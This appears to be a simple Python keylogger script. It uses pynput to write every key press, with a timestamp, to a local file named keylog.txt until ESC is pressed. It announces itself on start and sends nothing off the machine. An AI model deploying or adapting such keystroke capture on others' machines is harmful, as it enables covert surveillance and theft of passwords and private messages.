from pynput import keyboard
import datetime

pressed_keys = set()

def on_press(key):
    pressed_keys.add(key)
    
    if keyboard.Key.esc in pressed_keys:
        print("ESC is pressed. Exiting...")
        return False
    
    log_file = open("keylog.txt", "a")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
    log_file.write(f"{timestamp} - {key}\n")
    log_file.close()

def main():
    print("TO STOP THE LOGGING. PRESS ESC.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()